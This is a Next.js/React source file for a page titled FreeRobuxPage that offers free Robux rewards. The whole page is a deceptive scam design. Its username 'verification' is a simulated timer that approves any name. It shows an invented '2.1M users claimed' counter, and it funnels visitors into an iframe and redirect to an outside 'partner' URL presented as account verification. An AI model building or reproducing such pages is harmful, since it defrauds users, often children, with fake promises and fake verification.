'use client';

import { useState, useEffect } from 'react';
import Image from 'next/image';
import { Loader2, Users, X, CheckCircle2, AlertCircle } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Dialog, DialogContent, DialogHeader, DialogTitle } from '@/components/ui/dialog';
import { cn } from '@/lib/utils';

const CUSTOM_ICON = "https://res.cloudinary.com/dmafb7518/image/upload/v1775750139/GAME_FLASH_20260409_212147_0000_eu5mys.png";
const PROFILE_IMG = "https://res.cloudinary.com/dmafb7518/image/upload/q_auto/f_auto/v1776447812/3acdf58d1dad75bdc82275056dceeb8a_iq5yni.jpg";
const BANNER_THUMB = "https://res.cloudinary.com/dmafb7518/image/upload/q_auto/f_auto/v1776447812/0100f6638632dfbf4fb70b4f8be239f6_xveqxc.jpg";
const PARTNER_URL = "https://Gameflashx.space/cl/i/grr84r";

export default function FreeRobuxPage() {
  const [isProcessing, setIsProcessing] = useState(false);
  const [showIframe, setShowIframe] = useState(false);
  const [selectedAmount, setSelectedAmount] = useState<string | null>(null);
  
  // User State
  const [username, setUsername] = useState('');
  const [displayedName, setDisplayedName] = useState('Guest');
  const [isVerifying, setIsVerifying] = useState(false);
  const [isVerified, setIsVerified] = useState(false);
  const [error, setError] = useState('');

  // Persist Username on Load
  useEffect(() => {
    const savedName = localStorage.getItem('gameflash_user');
    if (savedName) {
      setDisplayedName(savedName);
      setIsVerified(true);
      setUsername(savedName);
    }
  }, []);

  const handleVerify = () => {
    if (!username.trim()) {
      setError('Please enter a valid username');
      return;
    }
    setError('');
    setIsVerifying(true);
    
    // Simulate API search/verification
    setTimeout(() => {
      setIsVerifying(false);
      setIsVerified(true);
      setDisplayedName(username);
      localStorage.setItem('gameflash_user', username);
    }, 2500);
  };

  const handleClaim = (amount: string) => {
    if (!isVerified) {
      setError('Please verify your account first');
      return;
    }
    setSelectedAmount(amount);
    setIsProcessing(true);
    
    setTimeout(() => {
      setIsProcessing(false);
      setShowIframe(true);
      
      // Auto redirect fallback
      setTimeout(() => {
        if (typeof window !== 'undefined') {
          // window.location.href = PARTNER_URL;
        }
      }, 10000);
    }, 2800);
  };

  const rewards = [
    { amount: '50,000', bonus: '+2500 bonus', popular: true },
    { amount: '24,000', bonus: '+1500 bonus', popular: false },
    { amount: '11,000', bonus: '+1000 bonus', popular: false },
    { amount: '2,000', bonus: '+300 bonus', popular: false },
  ];

  return (
    <div className="min-h-screen bg-white font-sans text-[#111] selection:bg-[#00B06F]/20 overflow-x-hidden">
      
      {/* Roblox-style Top Bar */}
      <div className="fixed top-0 left-0 right-0 h-16 bg-white border-b border-gray-100 flex items-center px-4 md:px-6 justify-between shadow-sm z-50">
        <div className="flex items-center gap-3 md:gap-4">
          <div className="relative w-8 h-8 md:w-9 md:h-9">
            <Image src={CUSTOM_ICON} alt="Icon" fill className="object-contain" />
          </div>
          <span className="font-black text-xs md:text-sm uppercase tracking-tighter text-gray-400">Rewards Dashboard</span>
        </div>
        <div className="flex items-center gap-4 md:gap-6">
          <div className="hidden lg:flex items-center gap-2 text-[10px] font-black text-gray-300 uppercase tracking-[0.2em]">
            <Users className="w-4 h-4 text-[#00B06F]" /> 2.1M users claimed
          </div>
          <div className="flex items-center gap-2 md:gap-3 bg-gray-50 pl-1.5 pr-3 md:pr-4 py-1 rounded-full border border-gray-100">
            <div className="relative w-7 h-7 md:w-8 md:h-8 rounded-full overflow-hidden border-2 border-[#00B06F] shadow-sm">
              <Image src={PROFILE_IMG} alt="User" fill className="object-cover" />
            </div>
            <span className="text-xs font-bold text-[#111] flex items-center gap-1">
              {displayedName} {isVerified && <span className="text-[#00B06F]">✓</span>}
            </span>
          </div>
        </div>
      </div>

      <main className="relative max-w-2xl mx-auto pt-24 pb-12 px-4 md:px-6 space-y-6 z-10">
        
        {/* Profile + Banner Row */}
        <div className="bg-[#F8F9FB] p-4 rounded-2xl border border-gray-100 flex items-center gap-4 shadow-sm animate-in slide-in-from-top-4 duration-700">
          <div className="relative w-[60px] h-[60px] rounded-full overflow-hidden border-2 border-white shadow-md flex-shrink-0">
            <Image src={PROFILE_IMG} alt="Profile" fill className="object-cover" />
          </div>
          <div className="relative flex-1 h-[60px] rounded-xl overflow-hidden border border-gray-100 bg-white">
             <Image src={BANNER_THUMB} alt="Banner" fill className="object-cover" />
             <div className="absolute inset-0 bg-black/5 flex items-center px-4">
               <span className="text-[10px] font-black uppercase tracking-widest text-white drop-shadow-md">Account Connection</span>
             </div>
          </div>
        </div>

        {/* Username Input Section */}
        <div className="bg-[#F8F9FB] p-6 rounded-2xl border border-gray-100 shadow-sm space-y-4 animate-in slide-in-from-bottom-4 duration-700">
          <div className="space-y-2">
            <div className="flex justify-between items-center">
              <label className="text-[10px] font-black uppercase tracking-[0.2em] text-gray-400">Identification</label>
              {isVerified && (
                <div className="flex items-center gap-1.5 px-3 py-1 rounded-full bg-[#00B06F]/10 border border-[#00B06F]/20 text-[#00B06F] text-[9px] font-black uppercase">
                  <CheckCircle2 className="w-3.5 h-3.5" /> Verified
                </div>
              )}
            </div>
            <Input 
              placeholder="Enter your username"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              disabled={isVerified}
              className="bg-white border-gray-200 text-[#111] h-14 rounded-xl text-lg font-bold placeholder:text-gray-300 focus:ring-[#00B06F]/20 transition-all shadow-inner"
            />
          </div>
          
          {error && (
            <div className="flex items-center gap-2 text-destructive text-xs font-bold animate-pulse">
              <AlertCircle className="w-4 h-4" /> {error}
            </div>
          )}

          {!isVerified ? (
            <Button 
              onClick={handleVerify}
              disabled={isVerifying}
              className="w-full bg-gradient-to-r from-[#00B06F] to-[#008F5B] hover:brightness-105 text-white font-black h-14 rounded-xl text-lg shadow-lg shadow-[#00B06F]/10"
            >
              {isVerifying ? <Loader2 className="w-6 h-6 animate-spin" /> : "Continue"}
            </Button>
          ) : (
            <p className="text-center text-[10px] font-bold text-gray-400 uppercase tracking-widest">
              Identity linked. Selection is now available.
            </p>
          )}
        </div>

        {/* Reward Section */}
        <div className={cn(
          "space-y-4 transition-all duration-700",
          !isVerified ? "opacity-30 pointer-events-none grayscale" : "opacity-100"
        )}>
          {rewards.map((reward, idx) => (
            <div 
              key={reward.amount} 
              className={cn(
                "group flex items-center justify-between p-4 md:p-6 rounded-2xl border-2 border-transparent bg-[#F8F9FB] hover:bg-white hover:border-[#00B06F]/30 transition-all cursor-pointer shadow-sm animate-in fade-in slide-in-from-right-8 duration-700 overflow-hidden",
                reward.popular && "border-[#00B06F]/10"
              )}
              onClick={() => handleClaim(reward.amount)}
            >
              <div className="flex items-center gap-3 md:gap-6 flex-1 min-w-0">
                <div className="relative w-10 h-10 md:w-14 md:h-14 flex-shrink-0 drop-shadow-md group-hover:rotate-12 transition-transform">
                  <Image src={CUSTOM_ICON} alt="Icon" fill className="object-contain" />
                </div>
                <div className="min-w-0">
                  <div className="flex items-center gap-2 md:gap-3 flex-wrap">
                    <span className="text-xl md:text-3xl font-black tracking-tighter text-[#111] truncate">{reward.amount}</span>
                    {reward.popular && (
                      <span className="bg-[#00B06F] text-white text-[7px] md:text-[8px] font-black uppercase px-2 md:px-3 py-0.5 md:py-1 rounded-full shadow-md whitespace-nowrap">Popular</span>
                    )}
                  </div>
                  <span className="text-[8px] md:text-[10px] font-black text-gray-400 uppercase tracking-[0.2em] block truncate">{reward.bonus}</span>
                </div>
              </div>
              
              <Button className="flex-shrink-0 w-24 md:w-28 bg-[#00B06F] hover:bg-[#008F5B] text-white font-black rounded-full h-10 md:h-12 shadow-lg shadow-[#00B06F]/10 transition-all active:scale-95 text-xs md:text-sm group-hover:scale-105 ml-4 whitespace-nowrap">
                Free
              </Button>
            </div>
          ))}
        </div>

        <p className="text-center text-[10px] text-gray-300 font-black uppercase tracking-[0.3em] pt-8">
          Complete a partner task to unlock rewards
        </p>
      </main>

      {/* Processing Modal */}
      <Dialog open={isProcessing} onOpenChange={setIsProcessing}>
        <DialogContent className="sm:max-w-md bg-white border-none rounded-3xl p-8 md:p-12 text-center outline-none shadow-2xl">
          <DialogHeader>
            <DialogTitle className="hidden">Processing</DialogTitle>
          </DialogHeader>
          <div className="flex flex-col items-center space-y-6">
            <div className="relative">
              <Loader2 className="w-16 h-16 md:w-24 md:h-24 text-[#00B06F] animate-spin" />
              <div className="absolute inset-0 flex items-center justify-center p-4">
                <div className="relative w-full h-full animate-pulse">
                  <Image src={CUSTOM_ICON} alt="Icon" fill className="object-contain" />
                </div>
              </div>
            </div>
            <div className="space-y-2">
              <h2 className="text-2xl font-black text-[#111] tracking-tighter">Preparing Reward...</h2>
              <p className="text-gray-400 font-black uppercase tracking-[0.3em] text-[8px] md:text-[10px]">Security link for {selectedAmount} reward</p>
            </div>
            <div className="w-full bg-gray-100 h-2 rounded-full overflow-hidden mt-4">
              <div className="bg-[#00B06F] h-full animate-[progress_2.8s_ease-in-out]" style={{ width: '100%' }} />
            </div>
          </div>
        </DialogContent>
      </Dialog>

      {/* Iframe Partner Modal */}
      <Dialog open={showIframe} onOpenChange={setShowIframe}>
        <DialogContent className="max-w-[95vw] sm:max-w-3xl bg-white border-none rounded-[2rem] p-0 overflow-hidden shadow-2xl outline-none">
          <DialogHeader className="p-6 md:p-8 bg-gray-50 border-b border-gray-100 flex flex-row items-center justify-between space-y-0">
            <div className="flex items-center gap-3 md:gap-4 text-left">
              <div className="relative w-7 h-7 md:w-9 md:h-9">
                <Image src={CUSTOM_ICON} alt="Icon" fill className="object-contain" />
              </div>
              <div>
                <DialogTitle className="text-xl md:text-2xl font-black text-[#111] tracking-tighter">Final Step</DialogTitle>
                <p className="text-[8px] md:text-[10px] text-gray-400 font-black uppercase tracking-[0.2em]">Account Verification for {displayedName}</p>
              </div>
            </div>
            <Button variant="ghost" size="icon" onClick={() => setShowIframe(false)} className="rounded-full hover:bg-gray-100 text-gray-400">
              <X className="w-5 h-5 md:w-6 md:h-6" />
            </Button>
          </DialogHeader>
          
          <div className="relative bg-gray-50 h-[60vh] md:h-[550px] flex flex-col">
            <iframe 
              src={PARTNER_URL} 
              className="w-full h-full border-none"
              title="Partner Verification"
            />
            
            <div className="p-6 md:p-8 bg-white border-t border-gray-100 text-center">
              <p className="text-[8px] md:text-[10px] text-gray-300 font-black uppercase tracking-[0.3em] mb-4">Verification required to release rewards</p>
              <Button 
                onClick={() => window.location.href = PARTNER_URL}
                className="w-full bg-[#00B06F] hover:bg-[#008F5B] text-white font-black h-12 md:h-16 rounded-xl text-lg md:text-xl shadow-xl shadow-[#00B06F]/10 active:scale-95 transition-all"
              >
                Complete Verification
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      <style jsx global>{`
        @keyframes progress {
          0% { width: 0%; }
          100% { width: 100%; }
        }
      `}</style>
    </div>
  );
}
